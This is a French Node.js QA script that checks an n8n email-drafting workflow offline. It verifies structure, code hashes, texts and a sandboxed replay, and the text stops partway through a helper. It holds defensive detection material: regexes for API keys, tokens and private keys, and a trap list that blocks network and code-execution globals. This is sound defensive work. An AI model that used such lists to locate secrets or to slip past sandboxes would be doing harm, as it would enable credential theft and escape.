// Juge HORS LIGNE du workflow n8n `presti-suivi-artisan` (chantier 4, lot L17 ; tâche 032-014).
//
// Il relit l'export du workflow (.orchestre/preuves/032-014/presti-suivi-artisan.workflow.json, tiré du n8n d'Oracle par le MCP),
// le brief (plans/011-cadrage-01-11/briefs/c4-n8n-suivi-artisan.md) et l'essai n8n (.orchestre/preuves/032-014/essai-n8n.json), et :
//   1. STRUCTURE : inactif ; nœuds permis seulement (Schedule Trigger, HTTP Request en GET, Code, note) ; aucun nœud d'envoi, d'écriture
//      ni de modèle ; chaque nœud HTTP comparé à un GABARIT EXACT (`parameters` ET `options`, pagination comprise : un proxy, des
//      certificats non vérifiés, une redirection, une réponse complète, une « next URL » rougissent — 032-010 É1, M10) ; `select=` égal
//      au tableau du brief et dans la liste permise ; filtres aux noms ET aux valeurs attendus (M1) ; `settings` en liste blanche ; aucun
//      secret ; chaîne des connexions exacte ;
//   2. EMPREINTES : le SHA-256 de chaque `jsCode` est épinglé ; toute différence dit « nouvel audit requis » (032-010 É3) ;
//   3. COLONNES : chaque colonne du brief est à la ligne citée de sa migration ; seul le registre (table à créer) n'en a pas ;
//   4. TEXTES : ceux du brief égaux à ceux du nœud ; chacun `statut: 'brouillon'` ; ni chiffre écrit hors des champs, ni mot du §7,
//      ni marque (rang 23), ni tournure du rang 10, ni mention d'IA, ni « part seul » pour une offre sans `plateforme.ia.auto` ;
//   5. REJEU dans un bac à sable (processus enfant `node --permission --disallow-code-generation-from-strings`, contexte vm sans objet
//      de l'hôte ; repris de scripts/detecteurs-n8n-qa.mjs, tâche 032-012, l.293-418, adapté : l'enfant reçoit l'entrée d'un nœud) :
//      aucun message sans événement réel (chaque événement renvoie à une ligne lue, dans la fenêtre de son étape ; chaque nombre est
//      recompté ICI) ; un seul message par étape et par artisan (registre, deux passages le même jour, cinq jours d'écart, plafond qui
//      reporte sans rien perdre) ; jamais un compte de démo, de fondateur, en suppression ou opposé au suivi, même si la requête ne
//      filtrait plus ; chaque étape à son jour pile, muette la veille et après sa fenêtre ; un oracle écrit ICI, sans le code du
//      workflow, doit rendre exactement la même sortie ;
//   6. ESSAI : la pin data de essai-n8n.json, rejouée hors ligne, rend la sortie de n8n ; chaque nœud HTTP y est épinglé ;
//   7. MUTANTS : chacun doit faire rougir la suite, pour la raison nommée ; un mutant du code est jugé SANS les empreintes.
//
// Aucun réseau, aucune base, aucun modèle. Lancement :
//   node --experimental-strip-types --import ./scripts/ts-loader.mjs scripts/suivi-artisan-qa.mjs
import { readFileSync } from 'node:fs'
import { createHash } from 'node:crypto'
import { spawn } from 'node:child_process'
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { peut } from '../lib/plans.ts'
import { mentionAssistant } from '../lib/mentionAssistant.ts'
import { PIED_AUTOMATIQUE } from '../lib/relancesImpayes.ts'
import { CANAL_IMPORT } from '../lib/canaux/regles.ts'

const RACINE = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const CHEMINS = {
  export: path.join(RACINE, '.orchestre/preuves/032-014/presti-suivi-artisan.workflow.json'),
  brief: path.join(RACINE, 'plans/011-cadrage-01-11/briefs/c4-n8n-suivi-artisan.md'),
  essai: path.join(RACINE, '.orchestre/preuves/032-014/essai-n8n.json'),
}
const lireJson = (f) => JSON.parse(readFileSync(f, 'utf8'))
const copie = (x) => JSON.parse(JSON.stringify(x))
const sha256 = (s) => createHash('sha256').update(String(s), 'utf8').digest('hex')

// ─── Ce que le workflow doit être (brief) ─────────────────────────────────────────────────────────────────────────────────────
const WORKFLOW_ID = '2HsfV00lGSX1KGY1'
const BASE = 'https://gorcdvmueakcncsmrouo.supabase.co/rest/v1/'
const IDENTIFIANT = { id: 'dTewDK98MLrNckNG', name: 'Supabase account' }
// La liste permise de la tâche (032-014, « À faire » 2), plus le registre à créer. Le brief en lit un sous-ensemble ; le `select=` de
// chaque lecture doit être EXACTEMENT le tableau du brief, lui-même inclus ici.
const PERMISES = {
  artisans: ['id', 'plan', 'created_at', 'is_founder', 'est_demo', 'suppression_demandee_le', 'notifications'],
  leads: ['id', 'artisan_id', 'canal', 'created_at'],
  devis: ['id', 'artisan_id', 'statut', 'created_at', 'envoye_le', 'accepte_le'],
  factures: ['id', 'artisan_id', 'statut', 'emise_le', 'avoir_de'],
  suivi_artisan_envois: ['cle', 'artisan_id', 'etape', 'envoye_le'],
}
const TABLE_A_CREER = 'suivi_artisan_envois'
const INTERDIT_COLONNE = /nom|e-?mail|tel|slug|metier|contact|adresse|message|contenu|texte/i
const IN_COMPTES = "={{ 'in.(' + ($('Lire comptes').all().map(i => i.json.id).filter(Boolean).join(',') || '00000000-0000-0000-0000-000000000000') + ')' }}"
const LECTURES = [
  { nom: 'Lire comptes', table: 'artisans', filtres: [['plan', 'in.(studio,signature,entreprise)'], ['est_demo', 'is.false'], ['is_founder', 'is.false'],
    ['suppression_demandee_le', 'is.null'], ['created_at', "={{ 'gte.' + $('Réglages du suivi').first().json.inscrits_depuis }}"]], ordre: 'id' },
  { nom: 'Lire demandes', table: 'leads', filtres: [['artisan_id', IN_COMPTES]], ordre: 'id' },
  { nom: 'Lire devis', table: 'devis', filtres: [['artisan_id', IN_COMPTES]], ordre: 'id' },
  { nom: 'Lire factures', table: 'factures', filtres: [['artisan_id', IN_COMPTES]], ordre: 'id' },
  { nom: 'Lire registre du suivi', table: TABLE_A_CREER, filtres: [['artisan_id', IN_COMPTES]], ordre: 'cle' },
]
const CHAINE = ['Déclencheur 10 h', 'Réglages du suivi', ...LECTURES.map((l) => l.nom), 'Départ du suivi', 'Étape premiers pas', 'Étape bilan J+14',
  'Étape bilan J+30', 'Garde du suivi', 'Textes du suivi (brouillons)', 'Brouillons et bilan']
const CODES = CHAINE.filter((n) => n !== 'Déclencheur 10 h' && !LECTURES.some((l) => l.nom === n))
const ETAPES_CODE = CODES.filter((n) => n !== 'Réglages du suivi')
const TYPES_PERMIS = new Set(['n8n-nodes-base.scheduleTrigger', 'n8n-nodes-base.httpRequest', 'n8n-nodes-base.code', 'n8n-nodes-base.stickyNote'])
const CLES_NOEUD = { 'n8n-nodes-base.scheduleTrigger': ['id', 'name', 'type', 'typeVersion', 'position', 'parameters'],
  'n8n-nodes-base.httpRequest': ['id', 'name', 'type', 'typeVersion', 'position', 'parameters', 'credentials', 'alwaysOutputData', 'executeOnce'],
  'n8n-nodes-base.code': ['id', 'name', 'type', 'typeVersion', 'position', 'parameters'],
  'n8n-nodes-base.stickyNote': ['id', 'name', 'type', 'typeVersion', 'position', 'parameters'] }
const REGLAGES_ATTENDUS = { executionOrder: 'v1', availableInMCP: true, timezone: 'Europe/Paris', saveDataSuccessExecution: 'none' }
const PAGINATION = { pagination: { paginationMode: 'updateAParameterInEachRequest', parameters: { parameters: [{ type: 'qs', name: 'offset', value: '={{ $pageCount * 1000 }}' }] },
  paginationCompleteWhen: 'other', completeExpression: '={{ !Array.isArray($response.body) || $response.body.length < 1000 }}', limitPagesFetched: true, maxRequests: 50 } }

// Les réglages du suivi, tenus ICI (l'oracle ne lit jamais ceux du workflow). Défauts du lot, à valider par Benj (brief).
const R = {
  mode: 'brouillon', mention_ia: 'non_vise', offres_suivies: ['studio', 'signature', 'entreprise'],
  etapes: { premiers_pas: { du: 0, au: 3, evenements_jusqu_a: 2 }, bilan_j14: { du: 14, au: 16 }, bilan_j30: { du: 30, au: 32 } },
  ecart_min_jours: 5, plafond_par_passage: 10,
}
const CHAMPS = { premiers_pas: [], bilan_j14: ['demandes_recues', 'devis_envoyes', 'devis_acceptes', 'factures_emises'], bilan_j30: ['demandes_recues', 'devis_envoyes', 'devis_acceptes', 'factures_emises'] }
const VARIANTES = { premiers_pas: ['premiere_demande', 'premier_devis_envoye', 'premier_devis_accepte', 'premiere_facture'], bilan_j14: ['comptes'], bilan_j30: ['comptes'] }
const CLES_BROUILLON = ['artisan_id', 'champs', 'cle', 'etape', 'evenements', 'variante'] // M11 : liste blanche exacte
const CLES_EVENEMENT = ['colonne', 'date', 'id', 'table']
const DATES_EVENEMENT = { leads: ['created_at'], devis: ['envoye_le', 'accepte_le'], factures: ['emise_le'] }
const NOEUD_DE_TABLE = { leads: 'Lire demandes', devis: 'Lire devis', factures: 'Lire factures' }

// ─── Les textes : mots et tournures interdits ─────────────────────────────────────────────────────────────────────────────────
// §7 (plan, « Vocabulaire », l.525) et rang 23 (l.101-102), en mots entiers, pluriel compris.
const MOTS_INTERDITS = ['agent', 'workflow', 'n8n', 'MCP', 'prompt', 'LLM', 'détecteur', 'opportunité', 'file', 'modèle', 'Hermes', 'Orca',
  'Claude', 'Anthropic', 'Opus', 'Sonnet', 'Haiku', 'GPT', 'OpenAI', 'Supabase']
const motEntier = (m) => new RegExp('(?<![\\p{L}\\p{N}])' + m.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + 's?(?![\\p{L}\\p{N}])', 'iu')
// Rang 10 (plan l.74-76 ; vault « Relances - prospection et produit » §2 ; mails.md:60-61) : ni reproche, ni accord présumé, ni urgence.
const TOURNURES = [/vous n['’]avez (pas|toujours pas|jamais|encore rien)/i, /sans (réponse|nouvelles) de votre part/i, /dernière chance/i, /\burgent/i,
  /dépêchez/i, /ne tardez pas/i, /trop tard/i, /n['’]oubliez pas/i, /toujours rien/i, /plus que \S+ jours?/i, /comme convenu/i, /vous vous êtes engagé/i]
// Ce qu'une offre sans `plateforme.ia.auto` ne fait pas (lib/plans.ts:149, peut()).
const PART_SEUL = [/\bpart(ent)? seul/i, /\benvoie(nt)? seul/i, /envoy[ée]+s? seul/i, /\brelances? prévues?/i, /tout seul/i]
// La mention d'IA (lib/mentionAssistant.ts:16) et le pied des impayés (lib/relancesImpayes.ts:62) : jamais dans un message de Presti.
const MENTIONS_IA = [mentionAssistant(''), mentionAssistant('X').replace(' de X.', ''), PIED_AUTOMATIQUE, 'rédigé et envoyé automatiquement', 'intelligence artificielle']
const SECRETS = [/sk_live_[A-Za-z0-9]{8,}/, /sk_test_[A-Za-z0-9]{8,}/, /rk_live_[A-Za-z0-9]{8,}/, /sk-ant-[A-Za-z0-9_-]{12,}/, /sb_secret_[A-Za-z0-9_-]{12,}/,
  /sb_publishable_[A-Za-z0-9_-]{12,}/, /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/, /\bre_[A-Za-z0-9]{20,}/, /xox[bpas]-[A-Za-z0-9-]{10,}/, /-----BEGIN [A-Z ]*PRIVATE KEY/,
  /\bBearer\s+[A-Za-z0-9._-]{12,}/i, /"(apikey|password|secret|token|accessToken|serviceRole)"\s*:/i]

// ─── Empreintes du code, posées par l'auteur (032-014) : à RECONFIRMER par l'audit distinct avant toute publication ───────────────
const EMPREINTES = new Map([
  ['Réglages du suivi', '3313ce0e88f37164c13c46c4eabe970827c0e89532db8bdea5946fc5262d063c'],
  ['Départ du suivi', '0c400605982fa8e9dbe49cb75ddd41ed62d0076f7893c8881bf0e393ff7730de'],
  ['Étape premiers pas', 'ca9253a78efe04931afc9e01a1da241fc3d2d3074302abd2966de410c02d1c9d'],
  ['Étape bilan J+14', 'f890c5fafe65b29a4f3721b893dc2999c058cee6afd81b586f0a952158216fa0'],
  ['Étape bilan J+30', '666d9f8ea9870bc6e015ae99704459b43f0bc6aa9dc6d0ab523f242ddb7483b5'],
  ['Garde du suivi', '879879d8b003984883b4b7c02ac57c9be5c2ff5de0c32618ef9e5af1146068f3'],
  ['Textes du suivi (brouillons)', '572b9ed2a2d5045c1db54a69809ce58025af7941cd3bdf2d3916fe41934632ce'],
  ['Brouillons et bilan', '2b94e17f558fc653e3400c10b9508d9140b50587811b9767935f3434e9bdb31c'],
])

// ─── Outils ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
const memeValeur = (a, b) => JSON.stringify(trier(a)) === JSON.stringify(trier(b))
function trier(x) {
  if (Array.isArray(x)) return x.map(trier)
  if (x && typeof x === 'object') return Object.fromEntries(Object.keys(x).sort().map((k) => [k, trier(x[k])]))
  return x
}
const jourParis = (v) => {
  if (typeof v !== 'string' || v.length < 10) return null
  const d = new Date(v)
  if (Number.isNaN(d.getTime())) return null
  const p = {}
  for (const x of new Intl.DateTimeFormat('en-GB', { timeZone: 'Europe/Paris', year: 'numeric', month: '2-digit', day: '2-digit' }).formatToParts(d)) p[x.type] = x.value
  return `${p.year}-${p.month}-${p.day}`
}
const ecartJours = (a, b) => Math.round((Date.parse(a + 'T00:00:00Z') - Date.parse(b + 'T00:00:00Z')) / 86400000)
const decaler = (j, n) => new Date(Date.parse(j + 'T00:00:00Z') + n * 86400000).toISOString().slice(0, 10)
const noeud = (wf, nom) => wf.nodes.find((n) => n.name === nom)
const codeDe = (wf, nom) => { const n = noeud(wf, nom); if (!n) throw new Error(`nœud absent : ${nom}`); return n.parameters?.jsCode ?? '' }

// ─── 1. Structure ─────────────────────────────────────────────────────────────────────────────────────────────────────────────
function gabaritHttp(l, brief) {
  const select = (brief.colonnes[l.table] ?? []).join(',')
  return { method: 'GET', url: BASE + l.table, authentication: 'predefinedCredentialType', nodeCredentialType: 'supabaseApi', sendQuery: true, specifyQuery: 'keypair',
    queryParameters: { parameters: [{ name: 'select', value: select }, ...l.filtres.map(([name, value]) => ({ name, value })), { name: 'order', value: l.ordre }, { name: 'limit', value: '1000' }] },
    options: { timeout: 30000, pagination: PAGINATION } }
}
function differences(attendu, reel, chemin, e) {
  if (attendu && typeof attendu === 'object' && reel && typeof reel === 'object' && Array.isArray(attendu) === Array.isArray(reel)) {
    const cles = new Set([...Object.keys(attendu), ...Object.keys(reel)])
    for (const k of cles) {
      if (!(k in reel)) e.push(`${chemin}.${k} absent`)
      else if (!(k in attendu)) e.push(`${chemin}.${k} en trop (${JSON.stringify(reel[k]).slice(0, 80)})`)
      else differences(attendu[k], reel[k], `${chemin}.${k}`, e)
    }
  } else if (JSON.stringify(attendu) !== JSON.stringify(reel)) e.push(`${chemin} = ${JSON.stringify(reel).slice(0, 120)} (attendu ${JSON.stringify(attendu).slice(0, 120)})`)
}
function structure(wf, brief) {
  const e = []
  if (wf.active !== false) e.push('workflow ACTIF : il doit rester inactif (active: false)')
  if (wf.activeVersionId !== null && wf.activeVersionId !== undefined) e.push('workflow publié (activeVersionId posé) : il ne doit jamais l\'être sans le « go » de Benj')
  if (wf.id !== WORKFLOW_ID) e.push(`identifiant du workflow ${wf.id} (attendu ${WORKFLOW_ID})`)
  if (!memeValeur(wf.settings ?? {}, REGLAGES_ATTENDUS)) e.push(`settings hors liste blanche : ${JSON.stringify(wf.settings)} (attendu ${JSON.stringify(REGLAGES_ATTENDUS)})`)
  const vus = new Set()
  for (const n of wf.nodes ?? []) {
    if (vus.has(n.name)) e.push(`nom de nœud en double : ${n.name}`)
    vus.add(n.name)
    if (!TYPES_PERMIS.has(n.type)) { e.push(`${n.name} : type ${n.type} interdit (seuls Schedule Trigger, HTTP Request en GET, Code et note) — nœud d'envoi, d'écriture ou de modèle ?`); continue }
    const permises = CLES_NOEUD[n.type]
    for (const k of Object.keys(n)) if (!permises.includes(k)) e.push(`${n.name} : clé de nœud « ${k} » interdite (${JSON.stringify(n[k]).slice(0, 60)})`)
    if (n.type === 'n8n-nodes-base.stickyNote') { if (Object.keys(n.parameters ?? {}).some((k) => !['content', 'width', 'height', 'color'].includes(k))) e.push(`${n.name} : paramètre de note inattendu`); continue }
    if (!CHAINE.includes(n.name)) e.push(`${n.name} : nœud inattendu (${n.type})`)
  }
  for (const nom of CHAINE) if (!noeud(wf, nom)) e.push(`nœud attendu absent : ${nom}`)
  const t = noeud(wf, 'Déclencheur 10 h')
  if (t && (t.type !== 'n8n-nodes-base.scheduleTrigger' || t.typeVersion !== 1.4 || !memeValeur(t.parameters, { rule: { interval: [{ field: 'days', daysInterval: 1, triggerAtHour: 10, triggerAtMinute: 0 }] } })))
    e.push('déclencheur : une fois par jour à 10 h (Schedule Trigger 1.4) attendu')
  for (const nom of CODES) {
    const n = noeud(wf, nom)
    if (!n) continue
    if (n.type !== 'n8n-nodes-base.code' || n.typeVersion !== 2) e.push(`${nom} : nœud Code 2 attendu`)
    if (!memeValeur(Object.keys(n.parameters ?? {}).sort(), ['jsCode', 'language', 'mode']) || n.parameters.mode !== 'runOnceForAllItems' || n.parameters.language !== 'javaScript')
      e.push(`${nom} : paramètres du nœud Code hors gabarit (mode, language, jsCode)`)
    if (/getWorkflowStaticData|\$getWorkflowStaticData|staticData/.test(n.parameters?.jsCode ?? '')) e.push(`${nom} : getWorkflowStaticData interdit (le registre vit en base)`)
  }
  for (const l of LECTURES) {
    const n = noeud(wf, l.nom)
    if (!n) continue
    if (n.type !== 'n8n-nodes-base.httpRequest' || n.typeVersion !== 4.5) { e.push(`${l.nom} : HTTP Request 4.5 attendu`); continue }
    if (n.parameters?.method !== 'GET') e.push(`${l.nom} : méthode ${n.parameters?.method} — seule une lecture GET est permise`)
    const sel = (n.parameters?.queryParameters?.parameters ?? []).find((p) => p.name === 'select')?.value ?? ''
    const cols = String(sel).split(',')
    for (const c of cols) {
      if (!/^[a-z_]+$/.test(c)) e.push(`${l.nom} : select= « ${c} » n'est pas un nom de colonne simple`)
      else if (!(PERMISES[l.table] ?? []).includes(c)) e.push(`${l.nom} : colonne « ${c} » hors de la liste permise${INTERDIT_COLONNE.test(c) ? ' (donnée personnelle ou texte)' : ''}`)
    }
    if (!memeValeur([...cols].sort(), [...(brief.colonnes[l.table] ?? [])].sort())) e.push(`${l.nom} : select= (${sel}) différent du tableau du brief (${(brief.colonnes[l.table] ?? []).join(',')})`)
    const qs = n.parameters?.queryParameters?.parameters ?? []
    for (const [nom, valeur] of l.filtres) if (!qs.some((p) => p.name === nom && p.value === valeur)) e.push(`${l.nom} : filtre ${nom}=${valeur.slice(0, 40)} absent ou changé (032-010 M1)`)
    const g = []
    differences(gabaritHttp(l, brief), n.parameters, l.nom, g)
    for (const x of g) e.push(`gabarit HTTP : ${x}`)
    if (!memeValeur(n.credentials, { supabaseApi: IDENTIFIANT })) e.push(`${l.nom} : identifiant ${JSON.stringify(n.credentials)} (attendu « Supabase account » seul, par son id)`)
    if (n.executeOnce !== true) e.push(`${l.nom} : executeOnce attendu`)
    if (n.alwaysOutputData !== true) e.push(`${l.nom} : alwaysOutputData attendu (une table vide ne doit pas couper la chaîne, 032-010 M10)`)
  }
  // Connexions : la chaîne exacte, rien d'autre.
  const attendues = {}
  for (let i = 0; i < CHAINE.length - 1; i++) attendues[CHAINE[i]] = { main: [[{ node: CHAINE[i + 1], type: 'main', index: 0 }]] }
  if (!memeValeur(wf.connections ?? {}, attendues)) e.push('connexions différentes de la chaîne attendue (un nœud branché en plus ou en moins)')
  // Aucun secret, nulle part dans l'export.
  const tout = JSON.stringify(wf)
  for (const re of SECRETS) if (re.test(tout)) e.push(`secret dans l'export (motif ${re.source.slice(0, 30)})`)
  return e
}

// ─── 2. Empreintes ────────────────────────────────────────────────────────────────────────────────────────────────────────────
function empreintes(wf) {
  const e = []
  const codes = wf.nodes.filter((n) => n.type === 'n8n-nodes-base.code')
  for (const n of codes) {
    const attendue = EMPREINTES.get(n.name)
    const vue = sha256(n.parameters?.jsCode ?? '')
    if (!attendue) e.push(`${n.name} : nœud Code sans empreinte épinglée — nouvel audit requis`)
    else if (vue !== attendue) e.push(`${n.name} : code différent de celui épinglé (sha256 ${vue.slice(0, 12)}…, épinglé ${attendue.slice(0, 12)}…) — nouvel audit requis`)
  }
  for (const nom of EMPREINTES.keys()) if (!codes.some((n) => n.name === nom)) e.push(`${nom} : nœud Code épinglé absent — nouvel audit requis`)
  return e
}

// ─── 3. Le brief : colonnes et textes ─────────────────────────────────────────────────────────────────────────────────────────
function lireBrief(texte) {
  const colonnes = {}
  const sources = []
  for (const m of texte.matchAll(/^\| `([a-z_]+)` \| `([a-z_]+)` \| (.+?) \|$/gm)) {
    ;(colonnes[m[1]] ??= []).push(m[2])
    sources.push({ table: m[1], colonne: m[2], source: m[3].trim() })
  }
  const textes = {}
  for (const m of texte.matchAll(/^### ([a-z_0-9]+)\.([a-z_0-9]+)\n\nObjet : (.+)\n\n```text\n([\s\S]*?)\n```$/gm)) {
    ;(textes[m[1]] ??= {})[m[2]] = { objet: m[3], corps: m[4] }
  }
  return { colonnes, sources, textes, mentionNonVisee: /\*\*Mention d'IA : non visé\.\*\*/.test(texte), brut: texte }
}
function colonnesSourcees(brief) {
  const e = []
  if (!brief.sources.length) e.push('brief : tableau des colonnes introuvable')
  for (const s of brief.sources) {
    if (!(PERMISES[s.table] ?? []).includes(s.colonne)) e.push(`brief : colonne ${s.table}.${s.colonne} hors de la liste permise de la tâche`)
    if (s.table === TABLE_A_CREER) { if (!/^à créer/.test(s.source)) e.push(`brief : ${s.table}.${s.colonne} — le registre n'a pas de migration (« à créer » attendu)`); continue }
    const m = /^`(\d{4}_[a-z0-9_]+\.sql):(\d+)`$/.exec(s.source)
    if (!m) { e.push(`brief : source illisible pour ${s.table}.${s.colonne} (« fichier:ligne » attendu)`); continue }
    let ligne = ''
    try { ligne = readFileSync(path.join(RACINE, 'supabase/migrations', m[1]), 'utf8').split('\n')[Number(m[2]) - 1] ?? '' } catch { e.push(`brief : migration ${m[1]} introuvable`); continue }
    if (!new RegExp('(^|[^a-z_])' + s.colonne + '([^a-z_]|$)').test(ligne)) e.push(`brief : ${s.table}.${s.colonne} absente de ${m[1]}:${m[2]} (« ${ligne.trim().slice(0, 80)} »)`)
  }
  for (const t of Object.keys(PERMISES)) if (!brief.colonnes[t]?.length) e.push(`brief : aucune colonne pour ${t}`)
  return e
}
function verifierTextes(textesNoeud, brief) {
  const e = []
  if (!brief.mentionNonVisee) e.push('brief : la déclaration « Mention d\'IA : non visé » manque')
  if (!textesNoeud || typeof textesNoeud !== 'object') return [...e, 'textes du nœud illisibles']
  for (const etape of Object.keys(VARIANTES)) for (const v of VARIANTES[etape]) if (!textesNoeud[etape]?.[v]) e.push(`texte absent : ${etape}.${v}`)
  for (const [etape, vs] of Object.entries(textesNoeud)) for (const [v, t] of Object.entries(vs ?? {})) {
    const nom = `${etape}.${v}`
    if (!VARIANTES[etape]?.includes(v)) e.push(`texte inattendu : ${nom}`)
    for (const k of Object.keys(t)) if (!['statut', 'objet', 'corps', 'offres'].includes(k)) e.push(`${nom} : clé de texte « ${k} » inattendue`)
    if (t.statut !== 'brouillon') e.push(`${nom} : statut « ${t.statut} » — chaque texte reste un brouillon tant que Benj ne l'a pas validé`)
    const b = brief.textes[etape]?.[v]
    if (!b) e.push(`${nom} : absent du brief`)
    else {
      if (b.objet !== t.objet) e.push(`${nom} : objet du brief différent de celui du nœud`)
      if (b.corps !== t.corps) e.push(`${nom} : corps du brief différent de celui du nœud`)
    }
    const tout = `${t.objet}\n${t.corps}`
    const places = [...tout.matchAll(/\{([a-z_]+)\}/g)].map((m) => m[1])
    for (const p of places) if (!CHAMPS[etape]?.includes(p)) e.push(`${nom} : champ {${p}} inconnu de l'étape`)
    if (/\p{N}/u.test(tout.replace(/\{[a-z_]+\}/g, ''))) e.push(`${nom} : chiffre écrit dans le texte (les nombres viennent des champs comptés)`)
    for (const m of MOTS_INTERDITS) if (motEntier(m).test(tout)) e.push(`${nom} : mot interdit « ${m} » (plan §7 ou rang 23)`)
    for (const re of TOURNURES) if (re.test(tout)) e.push(`${nom} : tournure interdite (rang 10) ${re}`)
    for (const m of MENTIONS_IA) if (m && tout.includes(m)) e.push(`${nom} : mention d'IA dans un message de Presti (non visé)`)
    if (/\bIA\b|\bassistant\b/i.test(tout)) e.push(`${nom} : « IA » ou « assistant » dans un message de Presti (mention non visée)`)
    const offres = Array.isArray(t.offres) ? t.offres : R.offres_suivies
    if (PART_SEUL.some((re) => re.test(tout)) && offres.some((o) => !peut(o, 'plateforme.ia.auto'))) e.push(`${nom} : « part seul » ou « relance prévue » pour une offre sans plateforme.ia.auto (${offres.filter((o) => !peut(o, 'plateforme.ia.auto')).join(', ')})`)
    if (!/ne plus recevoir ces e-mails/i.test(tout)) e.push(`${nom} : la ligne pour ne plus recevoir ces e-mails manque`)
  }
  for (const [etape, vs] of Object.entries(brief.textes)) for (const v of Object.keys(vs)) if (!textesNoeud[etape]?.[v]) e.push(`brief : texte ${etape}.${v} absent du nœud`)
  return e
}

// ─── 5. Le bac à sable (repris de scripts/detecteurs-n8n-qa.mjs:293-418, tâche 032-012 ; adapté : entrée d'un nœud fournie) ──────
// L'enfant est lancé avec `--permission` sans aucune `--allow-*` (ni lecture ni écriture disque, ni processus, ni worker) et
// `--disallow-code-generation-from-strings`, environnement vide. `fetch`, `WebSocket`, `process.getBuiltinModule` et `process.binding` y
// sont retirés avant tout code. Chaque nœud a un contexte vm neuf (`vm.constants.DONT_CONTEXTIFY`), sans objet de l'hôte (les données
// passent en TEXTE JSON), génération de code coupée ; les noms dangereux et `this` y sont des pièges qui notent toute tentative.
function enfant() {
  'use strict'
  const vm = require('node:vm')
  const fs = require('node:fs')
  const os = require('node:os')
  const chemin = require('node:path')
  const processus = require('node:child_process')
  const fils = require('node:worker_threads')
  const reseau = require('node:net')
  for (const k of ['fetch', 'WebSocket', 'EventSource', 'XMLHttpRequest', 'require', 'module']) { try { delete globalThis[k] } catch { /* rien */ } }
  for (const k of ['getBuiltinModule', 'binding', '_linkedBinding', 'dlopen']) { try { process[k] = undefined } catch { /* rien */ } }
  const PIEGES = ['fetch', 'XMLHttpRequest', 'WebSocket', 'EventSource', 'require', 'module', 'exports', 'process', 'Buffer', 'global',
    'setTimeout', 'setInterval', 'setImmediate', 'helpers', '$http', '$execution', '$getWorkflowStaticData', 'getWorkflowStaticData',
    '$env', '$vars', '$secrets', 'Function', 'eval', 'WebAssembly', 'SharedArrayBuffer', 'Atomics']
  const PREAMBULE = `(() => {
    'use strict'
    const D = JSON.parse(globalThis.__donnees); delete globalThis.__donnees
    const Chaine = String, appliquer = Reflect.apply, definir = Object.defineProperty, stringify = JSON.stringify
    const vues = []
    const note = (q) => { vues[vues.length] = Chaine(q) }
    const refus = (q) => { note(q); throw new TypeError(q + ' interdit dans un nœud Code (bac à sable du juge)') }
    for (const nom of ${JSON.stringify(PIEGES)}) definir(globalThis, nom, { get() { return refus(nom) }, set() { refus(nom) }, configurable: false })
    const fauxConstructeur = function () { return refus('génération de code (constructeur de fonction)') }
    for (const proto of [Object.getPrototypeOf(function () {}), Object.getPrototypeOf(async function () {}), Object.getPrototypeOf(function* () {}), Object.getPrototypeOf(async function* () {})]) {
      definir(proto, 'constructor', { value: fauxConstructeur, writable: false, configurable: false })
    }
    const enItems = (l) => (l || []).map((j) => ({ json: j }))
    const $ = (nom) => {
      if (!Object.prototype.hasOwnProperty.call(D.sorties, nom)) throw new Error("lecture d'un nœud inconnu : " + nom)
      const items = enItems(D.sorties[nom]); return { all: () => items, first: () => items[0] }
    }
    const entree = enItems(D.entree)
    const $input = { all: () => entree, first: () => entree[0] }
    const $now = { setZone: (z) => { if (z !== 'Europe/Paris') throw new Error('fuseau inattendu'); return { toISODate: () => D.jour } } }
    const ceci = new Proxy({}, {
      get(_, k) { return refus('this.' + Chaine(k)) }, set(_, k) { return refus('this.' + Chaine(k)) }, has(_, k) { return refus('this.' + Chaine(k)) },
      ownKeys() { return refus('this (clés)') }, getOwnPropertyDescriptor(_, k) { return refus('this.' + Chaine(k)) },
      defineProperty(_, k) { return refus('this.' + Chaine(k)) }, deleteProperty(_, k) { return refus('this.' + Chaine(k)) },
      getPrototypeOf() { return refus('this (prototype)') }, setPrototypeOf() { return refus('this (prototype)') },
    })
    let appels = 0, resultat = null
    definir(globalThis, '__harnais', { value: (f) => {
      appels++
      if (appels > 1) { note('harnais rappelé'); return }
      try {
        const r = appliquer(f, ceci, [$, $input, $now])
        if (r && typeof r.then === 'function') throw new Error('code asynchrone : non rejoué')
        if (!Array.isArray(r)) throw new Error("le code doit rendre une liste d'éléments")
        resultat = { items: r.map((i) => i && i.json) }
      } catch (e) { resultat = { erreur: Chaine(e && e.message || e) } }
    }, writable: false, configurable: false })
    definir(globalThis, '__resultat', { value: () => {
      let t = ''
      for (let i = 0; i < vues.length; i++) t += (i ? '\\u0001' : '') + vues[i]
      return t + '\\u0000' + appels + '\\u0000' + stringify(resultat || { erreur: 'harnais jamais appelé' })
    }, writable: false, configurable: false })
  })()`
  const texte = (e) => { try { return String(e && e.message || e).slice(0, 300) } catch { return 'erreur illisible' } }
  function executer(jsCode, sortiesTexte, entree, jour) {
    const ctx = vm.createContext(vm.constants.DONT_CONTEXTIFY, { name: 'noeud-code', codeGeneration: { strings: false, wasm: false }, microtaskMode: 'afterEvaluate' })
    ctx.__donnees = '{"sorties":' + sortiesTexte + ',"entree":' + JSON.stringify(entree) + ',"jour":' + JSON.stringify(jour) + '}'
    vm.runInContext(PREAMBULE, ctx, { timeout: 2000 })
    let erreurScript = null
    try { vm.runInContext('__harnais(function ($, $input, $now) {\n' + jsCode + '\n});', ctx, { timeout: 5000, filename: 'noeud-code.js' }) } catch (e) { erreurScript = texte(e) }
    let brut
    try { brut = vm.runInContext('__resultat()', ctx, { timeout: 1000 }) } catch (e) { return { items: null, erreur: 'résultat illisible : ' + texte(e), violations: ['résultat du bac à sable'] } }
    if (typeof brut !== 'string') return { items: null, erreur: 'résultat du bac à sable illisible', violations: ['résultat du bac à sable'] }
    const [vuesTexte, appels, json] = brut.split('\u0000')
    let r
    try { r = JSON.parse(json) } catch { r = { erreur: 'sortie non JSON' } }
    const violations = vuesTexte ? vuesTexte.split('\u0001') : []
    if (appels !== '1') violations.push(`harnais appelé ${appels} fois`)
    return { items: r.items, erreur: erreurScript || r.erreur || null, violations }
  }
  function unNoeud(nom, jsCode, sortiesTexte, entree, jour) {
    const r = executer(jsCode, sortiesTexte, entree, jour)
